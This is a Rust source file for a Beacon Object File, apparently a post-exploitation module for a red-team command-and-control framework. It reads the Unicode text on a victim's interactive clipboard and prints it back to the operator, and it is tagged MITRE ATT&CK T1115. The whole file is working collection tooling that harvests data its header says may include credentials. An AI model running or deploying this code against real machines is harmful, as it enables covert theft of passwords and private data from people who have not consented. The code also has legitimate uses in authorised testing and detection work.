//! # Clipboard Text BOF
//!
//! Reads a bounded Unicode-text snapshot from the current interactive
//! clipboard. Output can contain credentials or other sensitive values.
//!
//! ## MITRE ATT&CK
//! - T1115 - Clipboard Data
//!
//! ## Arguments
//! None. Output is capped at 8192 UTF-16 code units.

#![no_std]

use alloc::string::String;
use core::ffi::c_void;
use rustbof::{eprintln, println};

unsafe extern "system" {
    fn GetLastError() -> u32;
    fn OpenClipboard(window: *mut c_void) -> i32;
    fn CloseClipboard() -> i32;
    fn IsClipboardFormatAvailable(format: u32) -> i32;
    fn GetClipboardData(format: u32) -> *mut c_void;
    fn GlobalLock(memory: *mut c_void) -> *mut c_void;
    fn GlobalUnlock(memory: *mut c_void) -> i32;
    fn GlobalSize(memory: *mut c_void) -> usize;
}

const CF_UNICODETEXT: u32 = 13;
const MAX_UNITS: usize = 8192;

fn read_clipboard() -> Result<(String, bool), (&'static str, u32)> {
    unsafe {
        if IsClipboardFormatAvailable(CF_UNICODETEXT) == 0 {
            return Err(("Unicode text is not available", 0));
        }
        if OpenClipboard(core::ptr::null_mut()) == 0 {
            return Err(("OpenClipboard", GetLastError()));
        }

        let handle = GetClipboardData(CF_UNICODETEXT);
        if handle.is_null() {
            let status = GetLastError();
            CloseClipboard();
            return Err(("GetClipboardData", status));
        }
        let pointer = GlobalLock(handle) as *const u16;
        if pointer.is_null() {
            let status = GetLastError();
            CloseClipboard();
            return Err(("GlobalLock", status));
        }

        let available = GlobalSize(handle) / core::mem::size_of::<u16>();
        let limit = core::cmp::min(available, MAX_UNITS);
        let mut length = 0usize;
        while length < limit && *pointer.add(length) != 0 {
            length += 1;
        }
        let truncated = length == MAX_UNITS && available > MAX_UNITS;
        let text = String::from_utf16_lossy(core::slice::from_raw_parts(pointer, length));

        GlobalUnlock(handle);
        CloseClipboard();
        Ok((text, truncated))
    }
}

#[rustbof::main]
fn main() {
    println!("Clipboard text snapshot");
    println!("Warning: clipboard output may contain sensitive values.\n");
    match read_clipboard() {
        Ok((text, truncated)) => {
            if text.is_empty() {
                println!("<empty Unicode clipboard text>");
            } else {
                println!("{}", text);
            }
            if truncated {
                println!("\nClipboard output limit reached.");
            }
        }
        Err((stage, 0)) => eprintln!("{}", stage),
        Err((stage, status)) => eprintln!("{} failed: 0x{:X}", stage, status),
    }
}
